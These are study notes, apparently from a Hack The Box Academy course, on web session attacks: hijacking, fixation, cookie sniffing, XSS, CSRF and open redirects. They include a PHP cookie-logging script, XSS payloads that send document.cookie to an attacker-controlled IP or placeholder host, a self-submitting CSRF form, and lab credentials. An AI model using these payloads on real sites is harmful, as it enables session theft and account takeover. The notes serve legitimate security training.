# Introduction to sessions

- user session can be defined as a sequence

## Session Attacks

This module will cover different types of session attacks and how to exploit them. These are:

- `Session Hijacking`: In session hijacking attacks, the  
    attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and  
    impersonate the victim.
- `Session Fixation`: Session Fixation occurs when an  
    attacker can fixate a (valid) session identifier. As you can imagine,  
    the attacker will then have to trick the victim into logging into the  
    application using the aforementioned session identifier. If the victim  
    does so, the attacker can proceed to a Session Hijacking attack (since  
    the session identifier is already known).
- `XSS (Cross-Site Scripting)` <-- With a focus on user sessions
- `CSRF (Cross-Site Request Forgery)`: Cross-Site Request  
    Forgery (CSRF or XSRF) is an attack that forces an end-user to execute  
    inadvertent actions on a web application in which they are currently  
    authenticated. This attack is usually mounted with the help of  
    attacker-crafted web pages that the victim must visit or interact with.  
    These web pages contain malicious requests that essentially inherit the  
    identity and privileges of the victim to perform an undesired function  
    on the victim's behalf.
- `Open Redirects` <-- With a focus on user sessions: An  
    Open Redirect vulnerability occurs when an attacker can redirect a  
    victim to an attacker-controlled site by abusing a legitimate  
    application's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. As you can  
    imagine, this is possible when the legitimate application's redirection  
    functionality does not perform any kind of validation regarding the  
    websites which the redirection points to.

  

## Session Hijacking attacks

- we will take advantage of the insecure session identifiers ( id ) is not secure in this case .
- by finding a way to obtain them , use them to authenticate to the server ( imporsonating the vicitum ( making our self as we are the victum ) ) ;
- part 1: we need to identify the session identifier
    - as we saw the session identifier used here which is the thing that were identifing our session id → in our targets case is the cookie .

  

  

## Session Fixation

( creation ) (making ) (crafting) ..

---

- session fixation happens when an attacker can **fixate a valid session identifier .**
- Session fixation occurs when an attacker sets or knows the session identifier of a victim and lures the victim into using that session identifier. Once the victim has logged in or elevated privileges using the fixed session identifier, the attacker can then access the application using the same session identifier, effectively hijacking the session.
    
    The key issue in session fixation is that the application either:
    
    1. Fails to assign a new session identifier upon user authentication.
    2. Allows an attacker to dictate the session identifier, instead of always generating a new, unpredictable one for each session.
    
      
    

## Obtaining session identifiers without user interaction

- Obtaining session identifiers via Traffic sniffing
- there is a lot of packet sniffing tools but we will use wire-shark because wire-shark has a builtin filter that allows us to filter the protocol type we want to sniff its transactions HTTP , ssh , ftp and etc .
- okay so now all i did was that both me and the victum were on the same internet ( lan ) and then i used `sudo -E wireshark` to cabture the session identifier that is placed in the Cookie place and then i used *(auth-session=s%3AATdmmA8D8_rcwM51D4kGmvdcHzRWbdxk.mEa7GaxDoOQ99UrW14s1UAsQbbHlJLMVSncKNBSKBj8) to access the targets account and now i am like the user and has the same access he has .
- and what i did in wireshark was simply
    1. opening the ( any ) and capture its traffic and sniff on it .
    2. used the filter to HTTP only
    3. used the edit>package finder
    4. choosed package bite instead of package list and used it with string .
    5. as i know waht is the session identifier name so i searched for it in there ( search box ) so i searched for auth-session which is a package bite in the form of a string :) .
- ## Obtaining Session Identifiers Post-Exploitation (Web Server Access)
    
    **Note**: The below examples cannot be replicated in this section's lab exercise!
    
    During the post-exploitation phase, session identifiers and session  
    data can be retrieved from either a web server's disk or memory. Of  
    course, an attacker who has compromised a web server can do more than  
    obtain session data and session identifiers. That said, an attacker may  
    not want to continue issuing commands that increase the chances of  
    getting caught.
    
    ---
    
    ### PHP
    
    Let us look at where PHP session identifiers are usually stored.
    
    The entry `session.save_path` in `PHP.ini` specifies where session data will be stored.
    
    ```
    KareemAlsadeq@htb[/htb]$ locate php.iniKareemAlsadeq@htb[/htb]$ cat /etc/php/7.4/cli/php.ini | grep 'session.save_path'KareemAlsadeq@htb[/htb]$ cat /etc/php/7.4/apache2/php.ini | grep 'session.save_path'
    ```
    
    [![](https://academy.hackthebox.com/storage/modules/153/11.png)](https://academy.hackthebox.com/storage/modules/153/11.png)
    
    In our default configuration case it's `/var/lib/php/sessions`.  
    Now, please note a victim has to be authenticated for us to view their  
    session identifier. The files an attacker will search for use the name  
    convention `sess_<sessionID>`.
    
    How a PHP session identifier looks on our local setup.
    
    [![](https://academy.hackthebox.com/storage/modules/153/12.png)](https://academy.hackthebox.com/storage/modules/153/12.png)
    
    The same PHP session identifier but on the webserver side looks as follows.
    
    ```
    KareemAlsadeq@htb[/htb]$ ls /var/lib/php/sessionsKareemAlsadeq@htb[/htb]$ cat //var/lib/php/sessions/sess_s6kitq8d3071rmlvbfitpim9mm
    ```
    
    [![](https://academy.hackthebox.com/storage/modules/153/13.png)](https://academy.hackthebox.com/storage/modules/153/13.png)
    
    As already mentioned, for a hacker to hijack the user session related  
    to the session identifier above, a new cookie must be created in the  
    web browser with the following values:
    
    - cookie name: PHPSESSID
    - cookie value: s6kitq8d3071rmlvbfitpim9mm
    
    ---
    
    ### Java
    
    Now, let us look at where Java session identifiers are stored.
    
    According to the Apache Software Foundation:
    
    "The `Manager` element represents the _session manager_ that is used to create and maintain HTTP sessions of a web application.
    
    Tomcat provides two standard implementations of `Manager`.  
    The default implementation stores active sessions, while the optional  
    one stores active sessions that have been swapped out (in addition to  
    saving sessions across a server restart) in a storage location that is  
    selected via the use of an appropriate `Store` nested element. The filename of the default session data file is `SESSIONS.ser`."
    
    You can find more information [here](http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html).
    
    ---
    
    ### .NET
    
    Finally, let us look at where .NET session identifiers are stored.
    
    Session data can be found in:
    
    - The application worker process (aspnet_wp.exe) - This is the case in the _InProc Session mode_
    - StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the _OutProc Session mode_
    - An SQL Server
    
    Please refer to the following resource for more in-depth details: [Introduction To ASP.NET Sessions](https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/)
    
    ---
    
    ## Obtaining Session Identifiers Post-Exploitation (Database Access)
    
    In cases where you have direct access to a database via, for example,  
    SQL injection or identified credentials, you should always check for  
    any stored user sessions. See an example below.
    
    Code: sql
    
    ```
    show databases;
    use project;
    show tables;
    select * from users;
    ```
    
    [![](https://academy.hackthebox.com/storage/modules/153/14.png)](https://academy.hackthebox.com/storage/modules/153/14.png)
    
    Here we can see the users' passwords are hashed. We could spend time  
    trying to crack these; however, there is also a "all_sessions" table.  
    Let us extract data from that table.
    
    Code: sql
    
    ```
    select * from all_sessions;
    select * from all_sessions where id=3;
    
    ```
    
    [![](https://academy.hackthebox.com/storage/modules/153/15.png)](https://academy.hackthebox.com/storage/modules/153/15.png)
    
    Here we have successfully extracted the sessions! You could now authenticate as the user "Developer."
    
    It is about time we cover Session ID-obtaining attacks requiring user interaction. In the following sections, we will cover:
    
    - XSS (Cross-Site Scripting) <-- With a focus on user sessions
    - CSRF (Cross-Site Request Forgery)
    - Open Redirects <-- With a focus on user sessions
    
      
    

## Cross-site scripting ( XSS )

- for XSS to be able to result in session cookie leakage we will need :
    1. Session cookie to be carried in all HTTP requests .
    2. Session cookies should be accessible by Javascript code (the http only attribute should be missing ) .

[![](https://academy.hackthebox.com/storage/modules/153/20.png)](https://academy.hackthebox.com/storage/modules/153/20.png)

In such cases, it is best to use payloads with event handlers like `onload` or `onerror`  
since they fire up automatically and also prove the highest impact on  
stored XSS cases. Of course, if they're blocked, you'll have to use  
something else like `onmouseover`.

In one field , lets specify the following payload :

`"><img src=x onerror=prompt(document.domain)>`

- we want to learn how to obtain session cookies ..
    
    create( maliciouse profile ) then share ( lead to exploit)
    
    lets create a cookie logging script that → save it as log.php ( obtains victiim’s session cookie through sharing a vulerable to stored xss public profile
    
    ```
    <php
    $logFile = "cookieLog.txt";
    $cookie = $_REQUEST["c"];
    
    $handle = fopen($logFile, "a");
    fwrite($hanle, $cookie ."\n\n");
    fclose($handle);
    
    header("Location: http://www.google.com/");
    exit;
    ?>
    ```
    
    this php log script waits for any victum to request ?c=+document.cookie.
    
    then the script will collect the victums cookie for us that the victum just asked and requested .
    
    The cookie -logging script ( log.php) we just made → can be run as following :
    
    TUN Adapter IP is the tun interface’s IP .
    
    ```
    php -S < VPN / TUN Adapter IP > : 8000
    ```
    
    and the payload will be
    
    `<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>`
    
      
    
    **Note**: If you're doing testing in the real world, try using something like [XSSHunter](https://xsshunter.com/), [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator) or [Project Interactsh](https://app.interactsh.com/). A default PHP Server or Netcat may not send data in the correct form when the target web application utilizes HTTPS.
    
    A sample HTTPS>HTTPS payload example can be found below:
    
    Code: javascript
    
    ```
    <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>
    ```
    
      
    

## CSRF or XSRF

- the two shortcuts are for the same thing which is cross site request forgery .
- xsrf or csrf : is an attack that is used to force an end-user to excute inadvertent actions that the end-user is currently authenticated to .
- csrf usually happen by the help of a maliciouse web page that the victum must visit or interact with .
- leveraging the lack of anti-CSRF security mechanisms .
- csrf attacks generally target the functions that cause : a state change on the server .but, can also be used to access sensitive data like xss
- To successfully exploit a CSRF vulnerability, we need:
    
    - To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
    - The victim to be logged into the application at the time when the malicious cross-site request is issued

- look imp:
    
    Cross-site requests are common in web applications and are used for multiple legitimate purposes.
    
    Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an  
    end-user to execute inadvertent actions on a web application in which  
    they are currently authenticated. This attack is usually mounted with  
    the help of attacker-crafted web pages that the victim must visit or  
    interact with, leveraging the lack of anti-CSRF security mechanisms.  
    These web pages contain malicious requests that essentially inherit the  
    identity and privileges of the victim to perform an undesired function  
    on the victim's behalf. CSRF attacks generally target functions that  
    cause a state change on the server but can also be used to access  
    sensitive data.
    
    A successful CSRF attack can compromise end-user data and operations  
    when it targets a regular user. If the targeted end-user is an  
    administrative one, a CSRF attack can compromise the entire web  
    application.
    
    During CSRF attacks, the attacker does not need to read the server's  
    response to the malicious cross-site request. This means that [Same-Origin Policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) cannot be considered a security mechanism against CSRF attacks.
    
    **Reminder**: According to Mozilla, the same-origin  
    policy is a critical security mechanism that restricts how a document or  
    script loaded by one origin can interact with a resource from another  
    origin. The same-origin policy will not allow an attacker to read the  
    server's response to a malicious cross-site request.
    
    A web application is vulnerable to CSRF attacks when:
    
    - All the parameters required for the targeted request can be determined or guessed by the attacker
    - The application's session management is solely based on HTTP cookies, which are automatically included in browser requests
    
    To successfully exploit a CSRF vulnerability, we need:
    
    - To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
    - The victim to be logged into the application at the time when the malicious cross-site request is issued
    
    In your web application penetration testing or bug bounty hunting  
    endeavors, you will notice a lot of applications that feature no  
    anti-CSRF protections or anti-CSRF protections that can be easily  
    bypassed.
    
    We will focus on evading anti-CSRF protections in the following sections.
    
    ---
    
    ## Cross-Site Request Forgery Example
    
    Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target`.  
    Use the provided Pwnbox or a local VM with the supplied VPN key to  
    reach the target application and follow along. Don't forget to configure  
    the specified vhost (`xss.htb.net`) to access the application.
    
    Navigate to `http://xss.htb.net` and log in to the application using the credentials below:
    
    - Email: crazygorilla983
    - Password: pisces
    
    This is an account that we created to look at the functionality of the application.
    
    Run Burp Suite as follows.
    
    ```
    KareemAlsadeq@htb[/htb]$ burpsuite
    ```
    
    Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it.
    
    Now, click on "Save."
    
    You should see the below.
    
    [![](https://academy.hackthebox.com/storage/modules/153/28.png)](https://academy.hackthebox.com/storage/modules/153/28.png)
    
    We notice no anti-CSRF token in the update-profile request. Let's try  
    executing a CSRF attack against our account (Ela Stienen) that will  
    change her profile details by simply visiting another website (while  
    logged in to the target application).
    
    First, create and serve the below HTML page. Save it as `notmalicious.html`
    
    Code: html
    
    ```
    <html><body><form id="submitMe" action="http://xss.htb.net/api/update-profile" method="POST"><input type="hidden" name="email" value="attacker@htb.net" /><input type="hidden" name="telephone" value="&\#40;227&\#41;&\#45;750&#45;8112" /><input type="hidden" name="country" value="CSRF_POC" /><input type="submit" value="Submit request" /></form><script>
          document.getElementById("submitMe").submit()
        </script></body></html>
    ```
    
    If you are wondering how we ended up with the above form, please see the image below.
    
    [![](https://academy.hackthebox.com/storage/modules/153/29.png)](https://academy.hackthebox.com/storage/modules/153/29.png)
    
    We can serve the page above from our attacking machine as follows.
    
    ```
    KareemAlsadeq@htb[/htb]$ python -m http.server 1337Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
    ```
    
    No need for a proxy at this time, so don't make your browser go  
    through Burp Suite. Restore the browser's original proxy settings.
    
    While still logged in as Ela Stienen, open a new tab and visit the page you are serving from your attacking machine `http://<VPN/TUN Adapter IP>:1337/notmalicious.html`. You will notice that Ela Stienen's profile details will change to the ones we specified in the HTML page we are serving.
    
    [![](https://academy.hackthebox.com/storage/modules/153/30.png)](https://academy.hackthebox.com/storage/modules/153/30.png)
    
    Our assumption that there is no CSRF protection in the application  
    was correct. We were able to change Ela Stienen's profile details via a  
    cross-site request.
    
    We can now use the malicious web page we crafted to execute CSRF attacks against other users.
    
    Next, we will cover how we can attack applications that feature anti-CSRF mechanisms.
    

  

## lets talk about how to bypass another CSRF protection?

- first technique is NULL value ..
    - some web applications dont really look at the token of the csrf so we can just put the the header and this may work with some of the web application requests and really make us aschieve our target of sending this forgerated request .
- another way is to put a random value but with the equal length of characters .
- we may try to use our accounts valid csrf to access anthere account and treat it as if it is the other accounts csrf token because some WA may not look if it is related to which account and may just look if it is valid in the data base without making sure if it is valid for that account we are going to make a change on .
- To bypass anti-CSRF protections, we can try changing the request method. From _POST_ to _GET_
    
    Unexpected requests may be served without the need for a CSRF token.
    
- some times it is using a thing called double-submit cookie and the logic of it is just making sure that the cookie sent in the first request is similar to the second request .
- Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: `/login.php?redirect=dashboard`
    
    - ?url=
    - ?link=
    - ?redirect=
    - ?redirecturl=
    - ?redirect_uri=
    - ?return=
    - ?return_to=
    - ?returnurl=
    - ?go=
    - ?goto=
    - ?exit=
    - ?exitpage=
    - ?fromurl=
    - ?fromuri=
    - ?redirect_to=
    - ?next=
    - ?newurl=
    - ?redir=